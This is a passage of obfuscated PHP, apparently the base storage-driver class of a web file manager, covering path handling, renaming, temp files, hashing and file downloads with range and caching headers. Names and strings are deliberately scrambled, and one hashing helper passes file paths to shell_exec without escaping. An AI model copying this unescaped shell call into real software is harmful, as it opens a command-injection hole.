$eÓ†ğŒÎä; } static $D†ğîğ‰± = array(); goto E éî‰Ü’À; BÌÀ‡ˆÅÁß: $D†ğîğ‰±[$dëèÆó¡ë . $Cšå÷¤Úæ¯[76] . $C‰¡õéÌùØ . $Cšå÷¤Úæ¯[77] . $eÓ†ğŒÎä] = $eÓ†ğŒÎä; $D†ğîğ‰±[$dëèÆó¡ë . $Cšå÷¤Úæ¯[76] . $C‰¡õéÌùØ . $Cšå÷¤Úæ¯[77] . $aƒ¡ëĞ‘] = $eÓ†ğŒÎä; $D†ğîğ‰±[$C‰¡õéÌùØ . $Cšå÷¤Úæ¯[76] . $dëèÆó¡ë . $Cšå÷¤Úæ¯[77] . $aƒ¡ëĞ‘] = $aƒ¡ëĞ‘; goto cëæ™ÍäÍ; f¯Üñ„¾ëí: } public function getPathInner($c‚®°Ó½±) { $C¡ ¿òõø = IO::init($c‚®°Ó½±); return $C¡ ¿òõø->path; } public function getPathOuter($b³‡ˆÌ¡Ù¶) { $d‘œñ·å’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cŒÅæ‚¾Òó = strlen(trim($this->pathBase, $d‘œñ·å’[18])); $b³‡ˆÌ¡Ù¶ = substr(trim($b³‡ˆÌ¡Ù¶, $d‘œñ·å’[18]), $cŒÅæ‚¾Òó); return $this->pathDriver . $d‘œñ·å’[18] . ltrim($b³‡ˆÌ¡Ù¶, $d‘œñ·å’[18]); } public function isParentOf($CÂœ²Ù­ïÔ, $C‘”ÍºÂæ) { $Dô·ÌÛ•¯é =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CÂœ²Ù­ïÔ = rtrim(strtolower($CÂœ²Ù­ïÔ), $Dô·ÌÛ•¯é[18]) . $Dô·ÌÛ•¯é[18]; $C‘”ÍºÂæ = rtrim(strtolower($C‘”ÍºÂæ), $Dô·ÌÛ•¯é[18]) . $Dô·ÌÛ•¯é[18]; $A¤ŸÂïÆ¿É = strpos($C‘”ÍºÂæ, $CÂœ²Ù­ïÔ) === 0; return $A¤ŸÂïÆ¿É; } public function getType() { $c§Õá†‘× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f¾Û©Ï­øÉ = str_replace($c§Õá†‘×[81], $c§Õá†‘×[43], get_class($this)); return strtolower($f¾Û©Ï­øÉ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($d›‡ãö‘‡®, $cº¹…İ‰à“) { $fÂÓ¢½°¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cßÀ½ØÓğ = rtrim($d›‡ãö‘‡®, $fÂÓ¢½°¯[18]) . $fÂÓ¢½°¯[18] . $cº¹…İ‰à“; $Bíƒíèˆ = $this->exist($cßÀ½ØÓğ); return $Bíƒíèˆ ? $cßÀ½ØÓğ : !1; } public function setModifyTime($f„ÒÈÌÕ–‚, $B½ïœ›‰¼ = '') { } public function renameObject($Cî †ÜÖ±², $Dçİê±·¿È) { goto F¡«˜„‘ä¦; F¡«˜„‘ä¦: $C·İ¥—õãÜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÑºŞÛÈŸ´ = $Dçİê±·¿È; Hook::trigger($C·İ¥—õãÜ[82], $this, $Cî †ÜÖ±², $this, $this->pathFather($Cî †ÜÖ±²) . $Dçİê±·¿È); goto D—ª é‘—î; D—ª é‘—î: $Cî †ÜÖ±² = $this->getPathOuter($Cî †ÜÖ±²); $Dçİê±·¿È = $this->pathFather($Cî †ÜÖ±²) . $Dçİê±·¿È; if (IO::isFile($Cî †ÜÖ±²)) { $dƒ´Ÿª¸– = IO::copy($Cî †ÜÖ±², $this->pathFather($Cî †ÜÖ±²), REPEAT_RENAME_FOLDER, $EÑºŞÛÈŸ´); if ($dƒ´Ÿª¸–) { IO::remove($Cî †ÜÖ±²); } } else { $dƒ´Ÿª¸– = IO::mkdir($Dçİê±·¿È); if (!$dƒ´Ÿª¸–) { return !1; } $DŞ¶ƒ®‡ÉÙ = IO::listPath($Cî †ÜÖ±², !0); $F¶îªÏòÇ´ = array_merge($DŞ¶ƒ®‡ÉÙ[$C·İ¥—õãÜ[83]], $DŞ¶ƒ®‡ÉÙ[$C·İ¥—õãÜ[84]]); foreach ($F¶îªÏòÇ´ as $E¢”¹ùÅÓ¯) { IO::move($E¢”¹ùÅÓ¯[$C·İ¥—õãÜ[85]], $Dçİê±·¿È, REPEAT_RENAME_FOLDER); } IO::remove($Cî †ÜÖ±²); } goto C µ™É‹¯Ì; C µ™É‹¯Ì: return $dƒ´Ÿª¸– ? $Dçİê±·¿È : !1; goto B–’ÈÊ™×—; B–’ÈÊ™×—: } public function tempFile($AŞ›„³æ » = '', $CàÛ‡…ï…æ = '') { goto bø¦¦Æœ­Ş; D°ö¾ÅÔ÷ê: return $dƒœ¨ƒ«à‹; goto EÉóè»Ş…; F·Ë•ªÔ: $dƒœ¨ƒ«à‹ = $C¼¬µªœİİ . $AŞ›„³æ »; @touch($dƒœ¨ƒ«à‹); if ($CàÛ‡…ï…æ) { file_put_contents($dƒœ¨ƒ«à‹, $CàÛ‡…ï…æ); } goto D°ö¾ÅÔ÷ê; bø¦¦Æœ­Ş: if (!$AŞ›„³æ ») { $AŞ›„³æ » = rand_string(15); } $C¼¬µªœİİ = TEMP_FILES . rand_string(15) . $_SERVER[çŞáÓæÚô‚Ô‡][18]; @mkdir($C¼¬µªœİİ, 511, !0); goto F·Ë•ªÔ; EÉóè»Ş…: } public function tempFileRemve($cÜë˜‰†à) { @unlink($cÜë˜‰†à); @rmdir($this->pathFather($cÜë˜‰†à)); } public function mkfile($C¥ÑÄ‚”¢ï, $F‹¢Ñ®ñÍø = '', $Aó‚æ÷ÈË = REPEAT_RENAME) { } public function mkdir($a‚Æ‰¶ÄÄö, $bôˆ½Øì¶ô = REPEAT_SKIP) { } public function delFile($e‘ ¬Ò›ë) { } public function delFolder($BÕ“àÎË›ù) { } public function copyFile($D‹Ù¾›İ£‚, $fà¨ğßÖó) { } public function moveFile($EóêÉç« , $A †Ò¡¹ÏÛ) { } public function remove($dŞƒ‚ÕäÎ¸) { if ($this->isFile($dŞƒ‚ÕäÎ¸)) { return $this->delFile($dŞƒ‚ÕäÎ¸); } return $this->delFolder($dŞƒ‚ÕäÎ¸); } public function rename($B‚ôƒ½Ñ½Ù, $c‘ÌóÄà‹Ê) { } public function exist($e³å¢„î) { } public function findByHash($eàÂÚÚ„› = '', $CÄŒÜ¢Ü½Ü = '') { return !1; } public function isFile($F¸Ì«ø›¼Å) { } public function isFolder($dÉ„¾“ö¿Æ) { } public function size($A”§´¨—İ£) { } public function info($cöñĞ¨àôª) { } public function infoSimple($BÖÍêôÙ‘) { return $this->info($BÖÍêôÙ‘); } public function infoAuth($eãÔØ¯óë£) { return $this->info($eãÔØ¯óë£); } public function infoFull($AÇ‚ÔÃİ) { return $this->info($AÇ‚ÔÃİ); } public function infoWithChildren($f«Œº™°éŠ) { $D¥ŒõãÔ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $Dåà²À­„ = array(); if (isset($Dåà²À­„[$f«Œº™°éŠ])) { return $Dåà²À­„[$f«Œº™°éŠ]; } $AÛÜòš§çå = $this->info($f«Œº™°éŠ); if ($AÛÜòš§çå && $AÛÜòš§çå[$D¥ŒõãÔ[39]] == $D¥ŒõãÔ[86]) { $c’šãï›èÉ = array($D¥ŒõãÔ[87] => 0, $D¥ŒõãÔ[88] => 0, $D¥ŒõãÔ[89] => 0); $this->infoChildren($f«Œº™°éŠ, $c’šãï›èÉ); $AÛÜòš§çå[$D¥ŒõãÔ[87]] = $c’šãï›èÉ[$D¥ŒõãÔ[87]]; $AÛÜòš§çå[$D¥ŒõãÔ[90]] = array($D¥ŒõãÔ[91] => $c’šãï›èÉ[$D¥ŒõãÔ[88]], $D¥ŒõãÔ[92] => $c’šãï›èÉ[$D¥ŒõãÔ[89]]); $Dåà²À­„[$f«Œº™°éŠ] = $AÛÜòš§çå; } return $AÛÜòš§çå; } public function listPath($dÌáëŒáêÉ, $d¶‰œ×œ¥¤ = false) { } public function has($A­ÀÉ·÷Ò, $aßÀÏ™øœÁ = false, $bÂƒ ¡Å—½ = false) { } public function canRead($BÎí·ÍÓîò) { } public function canWrite($bÖ¬à’±àå) { } public function getContent($Aé±Öƒ…“Ñ) { } public function setContent($fŒÏèš´´ª, $Bíìƒ²·°õ = '') { } protected function infoChildren($B ½…ÇŸâ, &$EÊòĞ’ãø) { $cÂ£·èĞƒ· =& $_SERVER[çŞáÓæÚô‚Ô‡]; check_abort(); $aó¾À‹°òƒ = $this->listPath($B ½…ÇŸâ, !0); $aó¾À‹°òƒ = array_merge($aó¾À‹°òƒ[$cÂ£·èĞƒ·[84]], $aó¾À‹°òƒ[$cÂ£·èĞƒ·[83]]); foreach ($aó¾À‹°òƒ as $Bšó÷§Æ‰Ê) { if ($Bšó÷§Æ‰Ê[$cÂ£·èĞƒ·[39]] == $cÂ£·èĞƒ·[86]) { $EÊòĞ’ãø[$cÂ£·èĞƒ·[89]]++; $BäæŸ„¥Ùß = $this->getPathInner($Bšó÷§Æ‰Ê[$cÂ£·èĞƒ·[85]]); $this->infoChildren($BäæŸ„¥Ùß, $EÊòĞ’ãø); } else { $EÊòĞ’ãø[$cÂ£·èĞƒ·[88]]++; $EÊòĞ’ãø[$cÂ£·èĞƒ·[87]] += $Bšó÷§Æ‰Ê[$cÂ£·èĞƒ·[87]]; } } } public function fileSubstr($d„‚Ğ­ ˜ö, $aÖ‹¼£ËèÏ, $b¬§¼Ôêºô) { } public function listAll($bš ‚ùåÅ) { } public function upload($f¯†¦ØÈ¬Ù, $bíÔîÛôÖÈ, $Dœã›˜ƒÇÌ = false, $b³ÍÚ´…âŠ = REPEAT_REPLACE) { } public function uploadFileByID($c‡™à¥½, $d‹œ¥¼Ê‰…, $a‚®—¿‚×) { } public function uploadFileByPath($bŞèÎÎë, $D°ÅíáËêØ, $Aöß®é¢¼ = array()) { } public function isUploadServer() { $b¬„…†ì§ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $b¬„…†ì§ø[93]) { return !0; } return $GLOBALS[$b¬„…†ì§ø[16]][$b¬„…†ì§ø[94]][$b¬„…†ì§ø[95]]; } public function isFileOutServer() { $eÀŠËŞáˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $eÀŠËŞáˆ[93]) { return !0; } return $GLOBALS[$eÀŠËŞáˆ[16]][$eÀŠËŞáˆ[94]][$eÀŠËŞáˆ[96]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($eóÕÔ¥§éÍ) { $Eò÷÷–èŒŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->isCdnHost()) { return $eóÕÔ¥§éÍ; } return str_replace(trim(get_url_root($eóÕÔ¥§éÍ), $Eò÷÷–èŒŒ[18]), trim($this->cdnHost, $Eò÷÷–èŒŒ[18]), $eóÕÔ¥§éÍ); } public function uploadLink($d£å˜øÂÙ, $AĞÑ­ÇÄ¨ = 0) { goto CâÌö±ƒŠ©; F¸¤äâ·: if ($fÎ§†„©éÂ) { $fÎ§†„©éÂ[$fŠó…»ëÁ[99]] = $d£å˜øÂÙ; $fÎ§†„©éÂ[$fŠó…»ëÁ[100]] = $B—‡ÂÊéš; } return $fÎ§†„©éÂ; goto fÓ»‡Á‘™; CâÌö±ƒŠ©: $fŠó…»ëÁ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->isUploadServer()) { return; } $B—‡ÂÊéš = $this->getType(); goto B¼Ñ‚ëÈğì; B¼Ñ‚ëÈğì: if (!in_array($B—‡ÂÊéš, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $EØæ’õïŸ‡ = 1024 * 1024 * 10; goto dÃÊÜ×Ü‹; dÃÊÜ×Ü‹: $D‰Á„Ìß = $AĞÑ­ÇÄ¨ <= $EØæ’õïŸ‡ ? $fŠó…»ëÁ[97] : $fŠó…»ëÁ[98]; $B†÷†„Âç¯ = (!$AĞÑ­ÇÄ¨ ? 1 : ceil($AĞÑ­ÇÄ¨ / pow(1024, 3))) * 3600 * 4; $fÎ§†„©éÂ = $this->{$D‰Á„Ìß}($d£å˜øÂÙ, $B†÷†„Âç¯); goto F¸¤äâ·; fÓ»‡Á‘™: } public function uploadFormData($EÅĞ¾¦§ , $aÒ ¨è‚ÏĞ = 3600) { } public function multiUploadFormData($EšµäŒÇ¤„, $e¢ÖôºØ„ƒ = 3600) { } public function download($B‰ˆ£–×ó, $b·ƒÍ¿âÜÚ) { } public function ext($aÁÓï¾Ô‡‹) { $c—¶ÁãêÂ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (strpos($aÁÓï¾Ô‡‹, $c—¶ÁãêÂ[18]) === -1) { $a™É¤Ÿ»™· = $aÁÓï¾Ô‡‹; } else { $a™É¤Ÿ»™· = $this->pathThis($aÁÓï¾Ô‡‹); } $A´Ó­ïÃŞ = $c—¶ÁãêÂ[43]; if (strstr($a™É¤Ÿ»™·, $c—¶ÁãêÂ[101])) { $A´Ó­ïÃŞ = substr($a™É¤Ÿ»™·, strrpos($a™É¤Ÿ»™·, $c—¶ÁãêÂ[101]) + 1); $A´Ó­ïÃŞ = strtolower($A´Ó­ïÃŞ); } if (strlen($A´Ó­ïÃŞ) > 3 && preg_match($c—¶ÁãêÂ[102], $A´Ó­ïÃŞ, $fÀóìœ¤È¯)) { $A´Ó­ïÃŞ = $c—¶ÁãêÂ[43]; } return $A´Ó­ïÃŞ; } public function pathThis($Dğ§Ëí¸¸‹) { $dŠ¡…íË =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Dğ§Ëí¸¸‹ = str_replace($dŠ¡…íË[103], $dŠ¡…íË[18], rtrim($Dğ§Ëí¸¸‹, $dŠ¡…íË[18])); $d—ŞÚ°‰” = strrpos($Dğ§Ëí¸¸‹, $dŠ¡…íË[18]); if ($d—ŞÚ°‰” === !1) { return $Dğ§Ëí¸¸‹; } return substr($Dğ§Ëí¸¸‹, $d—ŞÚ°‰” + 1); } public function pathFather($bØ¤¬…É—Ú) { $c´áÅÀ™¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bØ¤¬…É—Ú = str_replace($c´áÅÀ™¹[103], $c´áÅÀ™¹[18], rtrim($bØ¤¬…É—Ú, $c´áÅÀ™¹[18])); $c¨ö§Öˆ„é = strrpos($bØ¤¬…É—Ú, $c´áÅÀ™¹[18]); if ($c¨ö§Öˆ„é === !1) { return $c´áÅÀ™¹[43]; } return substr($bØ¤¬…É—Ú, 0, $c¨ö§Öˆ„é + 1); } public function hashSimple($BĞ–ÕÓ‚İ¬) { goto b“ÓâÄ½¸; fÎÕ­ª»£‚: $dâƒ‚‰â = 200; $c«„ã¦´á° = 50; if ($C„¬ˆñª‡ <= $dâƒ‚‰â * $c«„ã¦´á°) { return $this->hashMd5($BĞ–ÕÓ‚İ¬) . $C„¬ˆñª‡; } goto A™ŠÁ»„êá; b“ÓâÄ½¸: $C†ºŒòÍË¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$BĞ–ÕÓ‚İ¬) { return md5($C†ºŒòÍË¢[43]); } $C„¬ˆñª‡ = $this->size($BĞ–ÕÓ‚İ¬); goto fÎÕ­ª»£‚; EŠÖóñĞ¾ñ: $Bë©×ÄŠ¤£ .= $this->fileSubstr($BĞ–ÕÓ‚İ¬, $C„¬ˆñª‡ - $dâƒ‚‰â, $dâƒ‚‰â); return md5($Bë©×ÄŠ¤£) . $C„¬ˆñª‡; goto då·¿æ”Òä; A™ŠÁ»„êá: $DÆƒ¬Ÿ™£¾ = intval($C„¬ˆñª‡ / $c«„ã¦´á°); $Bë©×ÄŠ¤£ = $C†ºŒòÍË¢[43]; for ($Dõçô£Û†Ã = 0; $Dõçô£Û†Ã < $c«„ã¦´á°; $Dõçô£Û†Ã++) { $Bë©×ÄŠ¤£ .= $this->fileSubstr($BĞ–ÕÓ‚İ¬, $DÆƒ¬Ÿ™£¾ * $Dõçô£Û†Ã, $dâƒ‚‰â); } goto EŠÖóñĞ¾ñ; då·¿æ”Òä: } public static $md5Cache = array(); public function hashMd5($Aáä¬½ƒ¬¢) { $Aáä¬½ƒ¬¢ = $this->iconvSystem($Aáä¬½ƒ¬¢); if (isset(self::$md5Cache[$Aáä¬½ƒ¬¢])) { return self::$md5Cache[$Aáä¬½ƒ¬¢]; } self::$md5Cache[$Aáä¬½ƒ¬¢] = $this->hashMd5Shell($Aáä¬½ƒ¬¢); if (!self::$md5Cache[$Aáä¬½ƒ¬¢]) { self::$md5Cache[$Aáä¬½ƒ¬¢] = @md5_file($Aáä¬½ƒ¬¢); } return self::$md5Cache[$Aáä¬½ƒ¬¢]; } private function hashMd5Shell($bÏÙ ŠÕ„ë) { goto cÛªé¬Êà; cÛªé¬Êà: $D‚ˆî¹©ßƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!function_exists($D‚ˆî¹©ßƒ[104])) { return !1; } $E«—Ø æ¨ = array($D‚ˆî¹©ßƒ[105], $D‚ˆî¹©ßƒ[106]); goto D…Á­±ºš; e‰‘„áˆ´˜: $F–»çÆŞˆŠ = shell_exec($fĞ°Šì—İí . "\x20\42{$bÏÙ ŠÕ„ë}\42"); $F–»çÆŞˆŠ = str_replace($D‚ˆî¹©ßƒ[110], $D‚ˆî¹©ßƒ[43], $F–»çÆŞˆŠ); return substr($F–»çÆŞˆŠ, 0, 32); goto cÀ‡©ŠÓÄ©; D…Á­±ºš: $fĞ°Šì—İí = Cache::get($D‚ˆî¹©ßƒ[107]); if (!$fĞ°Šì—İí) { $f²î¢‘³ö¯ = BASIC_PATH . $D‚ˆî¹©ßƒ[108]; $D²Óò²Óå = md5_file($f²î¢‘³ö¯); $fĞ°Šì—İí = $D‚ˆî¹©ßƒ[109]; foreach ($E«—Ø æ¨ as $DØ“ÁØÍÎœ) { $F–»çÆŞˆŠ = shell_exec($DØ“ÁØÍÎœ . "\x20\42{$f²î¢‘³ö¯}\x22"); if ($F–»çÆŞˆŠ && substr(trim($F–»çÆŞˆŠ), 0, 32) == $D²Óò²Óå) { $fĞ°Šì—İí = $DØ“ÁØÍÎœ; break; } } Cache::set($D‚ˆî¹©ßƒ[107], $fĞ°Šì—İí, 3600); } if ($fĞ°Šì—İí == $D‚ˆî¹©ßƒ[109]) { return !1; } goto e‰‘„áˆ´˜; cÀ‡©ŠÓÄ©: } public function link($CõÜ¼‹Ïœ) { return $CõÜ¼‹Ïœ; } public function fileOut($EºÚ²›êî®, $e’ö»¦– = false, $aïè¡—à„‰ = false, $E×ÃÕç = '') { goto cÙâÌ½äƒÅ; D‡ëøĞ: $c–Ññ¹Ë´ = rawurlencode($f—¨³ñøòÄ); $c–Ññ¹Ë´ = $b²¥”Ÿ‰·×[123] . $c–Ññ¹Ë´ . $b²¥”Ÿ‰·×[127] . $c–Ññ¹Ë´; if ($e’ö»¦–) { header($b²¥”Ÿ‰·×[128]); header($b²¥”Ÿ‰·×[129] . $c–Ññ¹Ë´); } else { header($b²¥”Ÿ‰·×[130] . $c–Ññ¹Ë´); } goto Fç¶Ô½İ¸; FÓêÓ³‰µ½: $bß‘¥¢ñ³ğ = $this->getType() == $b²¥”Ÿ‰·×[112]; $D·ÕÔ³ˆŠ¨ = $GLOBALS[$b²¥”Ÿ‰·×[16]][$b²¥”Ÿ‰·×[94]][$b²¥”Ÿ‰·×[113]][$b²¥”Ÿ‰·×[114]]; $EàÑåš”Èğ = (double) $GLOBALS[$b²¥”Ÿ‰·×[16]][$b²¥”Ÿ‰·×[94]][$b²¥”Ÿ‰·×[113]][$b²¥”Ÿ‰·×[115]] * 1024 * 1024; goto eæÚ£â…¥Œ; Fç¶Ô½İ¸: header($b²¥”Ÿ‰·×[131]); header($b²¥”Ÿ‰·×[132] . $bœ‘È‰“ó); header($b²¥”Ÿ‰·×[133] . gmdate($b²¥”Ÿ‰·×[116], time() + 3600 * 24 * 30) . $b²¥”Ÿ‰·×[134]); goto CİÕÑ‚¼†”; cÙâÌ½äƒÅ: $b²¥”Ÿ‰·× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->cacheMethod(null, null); if (!$EºÚ²›êî® || !$this->exist($EºÚ²›êî®)) { show_json(LNG($b²¥”Ÿ‰·×[111]), !1, $aïè¡—à„‰); } goto FÓêÓ³‰µ½; BÔ¿ö¤¤µÃ: $dåººô‡‡µ = !0; if ($_SERVER[$b²¥”Ÿ‰·×[161]] == $b²¥”Ÿ‰·×[162] && $döª”îÕ°è > 1204 * 1024 * 1024 * 2) { $dåººô‡‡µ = !1; } if ($dåººô‡‡µ) { header($b²¥”Ÿ‰·×[163] . ($AùÏš‘ÊØ¢ - $F†©ä˜óÎ© + 1)); } goto dÀÏœÜ»¢…; BÙºî³Œã˜: $BÄñ£§ª­æ = strtolower($_SERVER[$b²¥”Ÿ‰·×[149]]); if ($bß‘¥¢ñ³ğ && $BÄñ£§ª­æ && $D·ÕÔ³ˆŠ¨) { if (strstr($BÄñ£§ª­æ, $b²¥”Ÿ‰·×[150])) { header($b²¥”Ÿ‰·×[151] . $EºÚ²›êî®); } else { if (strstr($BÄñ£§ª­æ, $b²¥”Ÿ‰·×[152])) { header($b²¥”Ÿ‰·×[153] . $EºÚ²›êî®); } else { if (strstr($BÄñ£§ª­æ, $b²¥”Ÿ‰·×[154])) { header($b²¥”Ÿ‰·×[155] . $EºÚ²›êî®); } } } if ($EàÑåš”Èğ) { header($b²¥”Ÿ‰·×[156] . $EàÑåš”Èğ); } return; } if (isset($_SERVER[$b²¥”Ÿ‰·×[157]])) { if (preg_match($b²¥”Ÿ‰·×[158], $_SERVER[$b²¥”Ÿ‰·×[157]], $b´»èİ³é )) { $F†©ä˜óÎ© = intval($b´»èİ³é [1]); if (!empty($b´»èİ³é [2])) { $AùÏš‘ÊØ¢ = intval($b´»èİ³é [2]); } } header($b²¥”Ÿ‰·×[159]); header("\x43\157\156\x74\x65\x6e\164\x2d\122\x61\x6e\147\x65\x3a\x20\x62\171\x74\x65\x73\x20{$F†©ä˜óÎ©}\x2d{$AùÏš‘ÊØ¢}\57" . $döª”îÕ°è); } else { header($b²¥”Ÿ‰·×[160]); } goto BÔ¿ö¤¤µÃ; c‚å°ë¨Öé: $bœ‘È‰“ó = get_file_mime($D¿›ô×ÀŠ‰); if (strstr($bœ‘È‰“ó, $b²¥”Ÿ‰·×[124])) { $bœ‘È‰“ó = $bœ‘È‰“ó . $b²¥”Ÿ‰·×[125]; } if ($e’ö»¦– === !1 && !mime_support($bœ‘È‰“ó)) { $e’ö»¦– = !0; $bœ‘È‰“ó = $b²¥”Ÿ‰·×[126]; } goto D‡ëøĞ; dÌªƒõ’Øƒ: if (isset($_SERVER[$b²¥”Ÿ‰·×[138]]) && strtotime($_SERVER[$b²¥”Ÿ‰·×[138]]) == $Eà¯ŸÜÚÏ[$b²¥”Ÿ‰·×[117]]) { header($b²¥”Ÿ‰·×[139], !0, 304); die; } if (isset($_SERVER[$b²¥”Ÿ‰·×[140]]) && $_SERVER[$b²¥”Ÿ‰·×[140]] == $E×ÃÕç) { header($b²¥”Ÿ‰·×[141] . $E×ÃÕç, !0, 304); die; } header($b²¥”Ÿ‰·×[141] . $E×ÃÕç); goto e´»ç…¾ó; AŠ¿öœ¿–: $döª”îÕ°è = $Eà¯ŸÜÚÏ[$b²¥”Ÿ‰·×[87]]; $AÂ‡¶ƒæíš = gmdate($b²¥”Ÿ‰·×[116], $Eà¯ŸÜÚÏ[$b²¥”Ÿ‰·×[117]]); $f—¨³ñøòÄ = $aïè¡—à„‰ ? $aïè¡—à„‰ : $this->iconvApp($Eà¯ŸÜÚÏ[$b²¥”Ÿ‰·×[38]]); goto aÔ‡ƒİÁ¶¿; fÒ§Ø¬Œ„: if ($EàÑåš”Èğ) { $CòÉºÕ™“Æ = intval(1000 * 1000 * ($cÏ”—£¨Û / $EàÑåš”Èğ)); } while ($F†©ä˜óÎ© <= $AùÏš‘ÊØ¢) { $a“¨‡÷ï¾ = timeFloat(); check_abort(); $B›ËÈÂãˆï = $AùÏš‘ÊØ¢ - $F†©ä˜óÎ© + 1; if ($B›ËÈÂãˆï <= $cÏ”—£¨Û) { $cÏ”—£¨Û = $B›ËÈÂãˆï; } echo $this->fileSubstr($EºÚ²›êî®, $F†©ä˜óÎ©, $cÏ”—£¨Û); $F†©ä˜óÎ© += $cÏ”—£¨Û; if ($cÏ”—£¨Û == $B›ËÈÂãˆï) { $F†©ä˜óÎ© = $AùÏš‘ÊØ¢ + 1; } if ($CòÉºÕ™“Æ) { $Eô¹´ƒ»ÚÀ = intval(1000 * 1000 * (timeFloat() - $a“¨‡÷ï¾)); $E©“¹â¢Ü‚ = $CòÉºÕ™“Æ - $Eô¹´ƒ»ÚÀ; if ($E©“¹â¢Ü‚ > 5) { usleep($E©“¹â¢Ü‚); } } } goto aç›õİî†Ì; d‹æËåİœÀ: header($b²¥”Ÿ‰·×[145] . $döª”îÕ°è); header($b²¥”Ÿ‰·×[146]); if (!$e’ö»¦– && $D¿›ô×ÀŠ‰ == $b²¥”Ÿ‰·×[147]) { if ($döª”îÕ°è > 1024 * 1024 * 5) { die; } $C…„ä˜³õÁ = $this->getContent($EºÚ²›êî®); $C…„ä˜³õÁ = Html::clearSVG($C…„ä˜³õÁ); header($b²¥”Ÿ‰·×[148] . $döª”îÕ°è); echo $C…„ä˜³õÁ; die; } goto BÙºî³Œã˜; bˆ‘Íƒ¼•†: if (in_array($D¿›ô×ÀŠ‰, array($b²¥”Ÿ‰·×[118], $b²¥”Ÿ‰·×[119], $b²¥”Ÿ‰·×[120], $b²¥”Ÿ‰·×[121]))) { $D¿›ô×ÀŠ‰ = $b²¥”Ÿ‰·×[122]; } if (!$E×ÃÕç) { $E×ÃÕç = md5($AÂ‡¶ƒæíš . $this->hashSimple($EºÚ²›êî®)); } $E×ÃÕç = $b²¥”Ÿ‰·×[123] . $E×ÃÕç . $b²¥”Ÿ‰·×[123]; goto c‚å°ë¨Öé; CİÕÑ‚¼†”: header($b²¥”Ÿ‰·×[135]); header($b²¥”Ÿ‰·×[136]); header($b²¥”Ÿ‰·×[137]); goto dÌªƒõ’Øƒ; dÀÏœÜ»¢…: if ($_SERVER[$b²¥”Ÿ‰·×[164]] == $b²¥”Ÿ‰·×[165]) { return; } $cÏ”—£¨Û = 1024 * 100; $CòÉºÕ™“Æ = 0; goto fÒ§Ø¬Œ„; e´»ç…¾ó: header($b²¥”Ÿ‰·×[142] . $AÂ‡¶ƒæíš . $b²¥”Ÿ‰·×[134]); header($b²¥”Ÿ‰·×[143] . $f—¨³ñøòÄ); header($b²¥”Ÿ‰·×[144]); goto d‹æËåİœÀ; eæÚ£â…¥Œ: @ob_end_clean(); set_timeout(); $Eà¯ŸÜÚÏ = $this->infoFull($EºÚ²›êî®); goto AŠ¿öœ¿–; aÔ‡ƒİÁ¶¿: $F†©ä˜óÎ© = 0; $AùÏš‘ÊØ¢ = $döª”îÕ°è - 1; $D¿›ô×ÀŠ‰ = $this->ext($f—¨³ñøòÄ); goto bˆ‘Íƒ¼•†; aç›õİî†Ì: } public function fileOutServer($d¬ïÕàÂ£·, $C£š—ÇË—‚ = false, $a¼ª¨¯†“‹ = false, $aİØÙò“Ğ = '') { $this->fileOut($d¬ïÕàÂ£·, $C£š—ÇË—‚, $a¼ª¨¯†“‹, $aİØÙò“Ğ); } public function fileOutLink($bÓ¢ãªÆÂ ) { header($_SERVER[çŞáÓæÚô‚Ô‡][166] . $bÓ¢ãªÆÂ ); die; } public function cacheMethod($CçÍë‰¿‡ø, $eî‚İïˆ²î) { goto F´è–äá‡ë; F´è–äá‡ë: $D÷Š·Ùº‡é =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $bó®³œ”†Œ = array(); $Cé›››ÃÂÄ = $eî‚İïˆ²î ? ltrim($this->getPathOuter($eî‚İïˆ²î), $D÷Š·Ùº‡é[18]) : $eî‚İïˆ²î; goto A¡œÜÆ•·; A¡œÜÆ•·: $dõì«¾Š‰ = $D÷Š·Ùº‡é[167] . $CçÍë‰¿‡ø . $D÷Š·Ùº‡é[168] . rtrim($Cé›››ÃÂÄ, $D÷Š·Ùº‡é[18]); if (is_null($CçÍë‰¿‡ø)) { $bó®³œ”†Œ = array(); return; } if (is_null($eî‚İïˆ²î)) { unset($bó®³œ”†Œ[$dõì«¾Š‰]); return; } goto eÏ˜œÎ±¨ï; B»‰¸åÀ‡ß: $bó®³œ”†Œ[$dõì«¾Š‰] = $c”÷´‚ùá…; return $c”÷´‚ùá…; goto Cóƒñˆó£÷; eÏ˜œÎ±¨ï: $c”÷´‚ùá… = isset($bó®³œ”†Œ[$dõì«¾Š‰]) ? $bó®³œ”†Œ[$dõì«¾Š‰] : null; if (!is_null($c”÷´‚ùá…)) { return $c”÷´‚ùá…; } $c”÷´‚ùá… = $this->{$CçÍë‰¿‡ø}($eî‚İïˆ²î); goto B»‰¸åÀ‡ß; Cóƒñˆó£÷: } public function fileOutImage($BæÑÏ·®Ğğ, $aãì¬ì˜ = 250) { goto FÀ£Œ‚¯Å; dªëïÎƒˆ”: if (!($FÉ½Ï„Ûß = IO::move($C¿¸øğ”§, $cÇŒç¼Óè‚))) { return IO::fileOut($C¿¸øğ”§); } del_file($C¿¸øğ”§); IO::fileOut($FÉ½Ï„Ûß); goto BãÌöÁ¤ˆ¼; aÈƒ¢ÛÚ›: if (!($B½ÓöùÏ¤Â = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $bÄÎ°÷á¸[175]))) { $cÇŒç¼Óè‚ = 